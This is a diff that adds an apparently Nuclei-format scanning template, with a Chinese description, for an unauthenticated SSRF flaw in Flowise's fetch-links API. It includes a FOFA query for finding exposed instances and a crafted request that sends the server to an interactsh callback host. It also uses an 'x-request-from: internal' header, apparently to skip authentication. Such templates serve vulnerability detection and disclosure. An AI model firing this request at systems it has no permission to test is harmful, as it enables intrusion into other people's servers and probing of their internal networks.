@@ -1,0 +1,24 @@
+id: flowise-fetch-links-ssrf
+
+info:
+  name: "Flowise fetch-links 接口存在 SSRF 漏洞"
+  author: NdayPoc
+  severity: high
+  description: |-
+    fofa: title="Flowise"
+    Flowise 的 fetch-links 接口存在服务器端请求伪造（SSRF）缺陷。攻击者无需认证即可利用此缺陷访问受限内部资源并窃取服务器信息，导致系统安全性严重受损。
+  reference:
+  - https://mp.weixin.qq.com/s/jXRvAWM5VDJKDZ25fOgdcA
+  tags: Flowise
+
+http:
+- raw:
+  - |
+    GET /api/v1/fetch-links?url=http%3A%2F%2F{{interactsh-url}}%2F&relativeLinksMethod=webCrawl&limit=10 HTTP/1.1
+    Host: {{Hostname}}
+    x-request-from: internal
+  matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
